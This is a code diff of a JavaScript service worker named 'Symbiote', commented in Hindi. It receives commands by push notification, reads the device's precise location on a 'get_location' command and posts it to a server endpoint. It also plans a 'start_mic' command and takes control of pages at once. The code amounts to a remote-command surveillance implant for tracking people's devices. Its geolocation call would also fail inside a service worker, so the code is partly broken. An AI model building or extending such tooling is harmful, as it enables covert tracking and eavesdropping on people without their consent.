@@ -1,98 +1,127 @@
 // =================================================================
-//  "सिम्बायोट" - सर्विस वर्कर (sw.js)
+//  "सिम्बायोट" - सर्विस वर्कर (sw.js) - पूर्ण और विस्तृत संस्करण
 // =================================================================
 
-console.log('सिम्बायोट (सर्विस वर्कर) अब सक्रिय और कमांड के लिए तैयार है।');
+// यह संदेश ब्राउज़र के कंसोल में दिखाई देगा जब सर्विस वर्कर पहली बार सक्रिय होगा।
+console.log('[Symbiote] सर्विस वर्कर सक्रिय है और कमांड के लिए तैयार है।');
 
 // -----------------------------------------------------------------
 //  इवेंट लिस्नर 1: 'push' इवेंट
-//  यह तब चलता है जब सर्वर से कोई पुश नोटिफिकेशन (कमांड) आता है।
+//  यह तब चलता है जब आपके सर्वर (server.js) से कोई पुश नोटिफिकेशन (कमांड) आता है।
 // -----------------------------------------------------------------
 self.addEventListener('push', event => {
-    console.log('[Service Worker] पुश कमांड प्राप्त हुआ।');
+    console.log('[Symbiote] सर्वर से एक नया पुश कमांड प्राप्त हुआ।');
 
     let commandData;
     try {
         // पुश नोटिफिकेशन के साथ भेजे गए डेटा (कमांड) को पढ़ें
         commandData = event.data.json();
-        console.log('[Service Worker] कमांड:', commandData);
+        console.log('[Symbiote] प्राप्त कमांड:', commandData);
     } catch (e) {
-        console.error('[Service Worker] कमांड को पढ़ने में विफल:', e);
-        return;
+        console.error('[Symbiote] कमांड को JSON के रूप में पढ़ने में विफल:', e);
+        return; // अगर कमांड सही नहीं है तो आगे कुछ न करें
     }
 
-    // कमांड के आधार पर संबंधित फ़ंक्शन को कॉल करें
+    // यह सुनिश्चित करने के लिए कि कमांड सही प्रारूप में है
     if (commandData && commandData.command) {
-        switch (commandData.command) {
-            case 'get_location':
-                executeGetLocation();
-                break;
-            // आप भविष्य में और कमांड यहाँ जोड़ सकते हैं
-            // case 'start_mic':
-            //     executeStartMic();
-            //     break;
-            default:
-                console.log('[Service Worker] अज्ञात कमांड:', commandData.command);
-        }
+        
+        // waitUntil यह सुनिश्चित करता है कि ब्राउज़र इस काम के पूरा होने तक
+        // सर्विस वर्कर को बंद नहीं करेगा।
+        const promiseChain = executeCommand(commandData);
+        event.waitUntil(promiseChain);
+
+    } else {
+        console.log('[Symbiote] प्राप्त पुश डेटा में कोई वैध कमांड नहीं मिला।');
     }
 });
 
+// -----------------------------------------------------------------
+//  कमांड को निष्पादित करने वाला मुख्य फंक्शन
+// -----------------------------------------------------------------
+function executeCommand(commandData) {
+    switch (commandData.command) {
+        case 'get_location':
+            return executeGetLocation();
+
+        // आप भविष्य में और कमांड यहाँ जोड़ सकते हैं
+        // case 'start_mic':
+        //     return executeStartMic();
+
+        default:
+            console.log(`[Symbiote] अज्ञात कमांड: ${commandData.command}`);
+            return Promise.resolve(); // अज्ञात कमांड के लिए एक खाली वादा लौटाएं
+    }
+}
 
 // -----------------------------------------------------------------
-//  कमांड को निष्पादित करने वाले फ़ंक्शंस
+//  लोकेशन प्राप्त करने का फ़ंक्शन (अब ज़्यादा सुरक्षित और विस्तृत)
 // -----------------------------------------------------------------
-
-/**
- * कमांड: get_location
- * जियोलोकेशन API का उपयोग करके डिवाइस की वर्तमान लोकेशन प्राप्त करता है
- * और उसे सर्वर को वापस भेजता है।
- */
 function executeGetLocation() {
-    console.log('[Service Worker] लोकेशन प्राप्त करने का प्रयास कर रहा है...');
-    
-    // जियोलोकेशन API तक पहुंचने का वादा (Promise)
-    const locationPromise = new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(
-            position => resolve(position),
-            error => reject(error)
-        );
-    });
+    console.log('[Symbiote] लोकेशन प्राप्त करने का प्रयास कर रहा है...');
 
-    // जब लोकेशन मिल जाए तो क्या करना है
-    locationPromise.then(position => {
-        const locationData = {
-            type: 'location',
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy
-        };
-        
-        console.log('[Service Worker] लोकेशन मिली:', locationData);
-        
-        // मिली हुई लोकेशन को सर्वर पर भेजें
-        sendDataToServer(locationData);
+    // सर्विस वर्कर में जियोलोकेशन API तक पहुँचने के लिए एक वादा (Promise) बनाएँ
+    return new Promise((resolve, reject) => {
 
-    }).catch(error => {
-        console.error('[Service Worker] लोकेशन प्राप्त करने में त्रुटि:', error);
-        
-        // त्रुटि की जानकारी भी सर्वर को भेजें
-        sendDataToServer({
-            type: 'error',
-            message: 'लोकेशन प्राप्त करने में विफल: ' + error.message
-        });
+        // जाँच करें कि जियोलोकेशन उपलब्ध है या नहीं
+        if (self.navigator && self.navigator.geolocation) {
+            
+            self.navigator.geolocation.getCurrentPosition(
+                // सफलता का कॉलबैक
+                (position) => {
+                    const locationData = {
+                        type: 'location',
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    };
+                    console.log('[Symbiote] लोकेशन मिली:', locationData);
+                    
+                    // मिली हुई लोकेशन को सर्वर पर भेजें और वादे को पूरा करें
+                    resolve(sendDataToServer(locationData));
+                },
+                // त्रुटि का कॉलबैक
+                (error) => {
+                    console.error('[Symbiote] लोकेशन प्राप्त करने में त्रुटि:', error);
+                    const errorData = {
+                        type: 'error',
+                        message: `लोकेशन प्राप्त करने में विफल: ${error.message}`
+                    };
+                    
+                    // त्रुटि की जानकारी भी सर्वर को भेजें और वादे को पूरा करें
+                    resolve(sendDataToServer(errorData));
+                },
+                // जियोलोकेशन के विकल्प
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+
+        } else {
+            // अगर जियोलोकेशन उपलब्ध नहीं है
+            console.error('[Symbiote] इस सर्विस वर्कर में जियोलोकेशन समर्थित नहीं है।');
+            const errorData = {
+                type: 'error',
+                message: 'सर्विस वर्कर में जियोलोकेशन समर्थित नहीं है।'
+            };
+            
+            // त्रुटि की जानकारी सर्वर को भेजें और वादे को पूरा करें
+            resolve(sendDataToServer(errorData));
+        }
     });
 }
 
 
-/**
- * हेल्पर फ़ंक्शन: इकट्ठा किए गए डेटा को सर्वर पर भेजता है
- * @param {object} data - वह डेटा जिसे सर्वर को भेजना है
- */
+// -----------------------------------------------------------------
+//  हेल्पर फंक्शन: इकट्ठा किए गए डेटा को सर्वर पर भेजना
+// -----------------------------------------------------------------
 function sendDataToServer(data) {
-    console.log('[Service Worker] डेटा सर्वर पर भेजा जा रहा है:', data);
+    console.log('[Symbiote] डेटा सर्वर पर भेजा जा रहा है:', data);
     
     // fetch API का उपयोग करके सर्वर के '/report-data' एंडपॉइंट पर POST रिक्वेस्ट भेजें
-    fetch('/report-data', {
+    // यह एक वादा (Promise) लौटाता है, जो waitUntil के लिए ज़रूरी है
+    return fetch('/report-data', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
@@ -101,29 +130,29 @@ function sendDataToServer(data) {
     })
     .then(response => {
         if (response.ok) {
-            console.log('[Service Worker] डेटा सफलतापूर्वक सर्वर पर भेजा गया।');
+            console.log('[Symbiote] डेटा सफलतापूर्वक सर्वर पर भेजा गया।');
         } else {
-            console.error('[Service Worker] सर्वर पर डेटा भेजने में विफल।');
+            console.error('[Symbiote] सर्वर पर डेटा भेजने में विफल। Status:', response.status);
         }
     })
     .catch(error => {
-        console.error('[Service Worker] सर्वर पर डेटा भेजने में नेटवर्क त्रुटि:', error);
+        console.error('[Symbiote] सर्वर पर डेटा भेजने में नेटवर्क त्रुटि:', error);
     });
 }
 
 
 // -----------------------------------------------------------------
-//  इवेंट लिस्नर 2: 'install' और 'activate'
-//  ये सर्विस वर्कर के जीवनचक्र के लिए आवश्यक हैं।
+//  इवेंट लिस्नर 2: 'install' इवेंट (अपरिवर्तित)
 // -----------------------------------------------------------------
 self.addEventListener('install', event => {
-    console.log('[Service Worker] इंस्टॉल हो रहा है...');
-    // नए सर्विस वर्कर को तुरंत सक्रिय करने के लिए
+    console.log('[Symbiote] इंस्टॉल हो रहा है...');
     self.skipWaiting();
 });
 
+// -----------------------------------------------------------------
+//  इवेंट लिस्नर 3: 'activate' इवेंट (अपरिवर्तित)
+// -----------------------------------------------------------------
 self.addEventListener('activate', event => {
-    console.log('[Service Worker] सक्रिय हो रहा है...');
-    // यह सुनिश्चित करता है कि सक्रिय सर्विस वर्कर पेज को नियंत्रित करे
-    clients.claim();
+    console.log('[Symbiote] सक्रिय हो रहा है और कंट्रोल ले रहा है...');
+    event.waitUntil(clients.claim());
 });
